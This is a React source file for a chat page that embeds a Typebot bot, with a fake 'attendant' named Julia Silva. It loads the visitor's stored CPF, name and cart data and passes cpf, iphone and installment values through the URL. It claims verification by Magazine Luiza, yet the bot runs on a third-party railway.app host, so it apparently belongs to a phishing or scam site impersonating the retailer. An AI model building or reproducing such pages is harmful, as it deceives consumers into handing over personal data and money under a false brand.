import { useEffect, useState, useRef } from "react";
import { ArrowLeft, Shield } from "lucide-react";
import { useLocation, useSearch } from "wouter";
import { CartItem } from "@/types";

/**
 * Página de Chat - Integração com Typebot
 * - Embed do Typebot para atendimento automatizado
 * - Header com informações do atendimento
 * - Foto da atendente Julia Silva
 * - Recebe UTMs: cpf, iphone, parcela (mantidos na URL para o Typebot)
 */

interface CPFData {
  nome?: string;
  cpf?: string;
  [key: string]: unknown;
}

declare global {
  interface Window {
    Typebot: {
      initStandard: (config: {
        typebot: string;
        apiHost: string;
      }) => void;
    };
  }
  namespace JSX {
    interface IntrinsicElements {
      'typebot-standard': React.DetailedHTMLProps<React.HTMLAttributes<HTMLElement> & { style?: React.CSSProperties }, HTMLElement>;
    }
  }
}

export default function Chat() {
  const [, navigate] = useLocation();
  const searchString = useSearch();
  const [cpfData, setCpfData] = useState<CPFData | null>(null);
  const [cartItem, setCartItem] = useState<CartItem | null>(null);
  const typebotInitialized = useRef(false);

  useEffect(() => {
    const savedCpfData = localStorage.getItem("cpfData");
    const savedCartItem = localStorage.getItem("cartItem");

    if (savedCpfData) {
      setCpfData(JSON.parse(savedCpfData));
    }
    if (savedCartItem) {
      setCartItem(JSON.parse(savedCartItem));
    }
  }, []);

  // Inicializar Typebot
  useEffect(() => {
    if (typebotInitialized.current) return;
    
    const script = document.createElement("script");
    script.type = "module";
    script.innerHTML = `
      import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0/dist/web.js';
      
      Typebot.initStandard({
        typebot: "magalu-mg410sp",
        apiHost: "https://viewer-production-6cdc.up.railway.app",
      });
    `;
    document.body.appendChild(script);
    typebotInitialized.current = true;

    return () => {
      // Cleanup se necessário
    };
  }, []);

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header */}
      <header className="sticky top-0 z-50 magalu-header">
        <div className="flex items-center px-3 py-3">
          <button
            onClick={() => navigate("/")}
            className="p-1 text-white"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
          <div className="ml-3 flex items-center gap-3">
            {/* Foto da atendente */}
            <div className="w-10 h-10 rounded-full overflow-hidden border-2 border-white">
              <img 
                src="/images/atendente-julia.jpg" 
                alt="Julia Silva - Atendente" 
                className="w-full h-full object-cover"
              />
            </div>
            <div>
              <h1 className="text-sm font-bold text-white">Julia Silva - Atendente</h1>
              <p className="text-xs text-white/80">Online agora</p>
            </div>
          </div>
        </div>
      </header>

      {/* User Info */}
      {cpfData && cartItem && (
        <div className="bg-blue-50 px-4 py-3 border-b border-blue-100">
          <p className="text-xs text-gray-600">
            <strong>Cliente:</strong> {cpfData.nome || "Cliente"} | 
            <strong> Produto:</strong> {cartItem.productName}
          </p>
        </div>
      )}

      {/* Typebot Container */}
      <div 
        className="flex-1 flex flex-col"
        dangerouslySetInnerHTML={{ 
          __html: '<typebot-standard style="width: 100%; height: 600px;"></typebot-standard>' 
        }}
      />

      {/* Footer */}
      <div className="bg-white border-t border-gray-200 px-4 py-3">
        <div className="flex items-center justify-center gap-2 mb-1">
          <Shield className="w-4 h-4 text-[#00A650]" />
          <p className="text-xs text-gray-600">
            Atendimento seguro e verificado pela Magazine Luiza
          </p>
        </div>
        <p className="text-xs text-center text-gray-500">
          Feito por Magazine Luiza
        </p>
      </div>
    </div>
  );
}
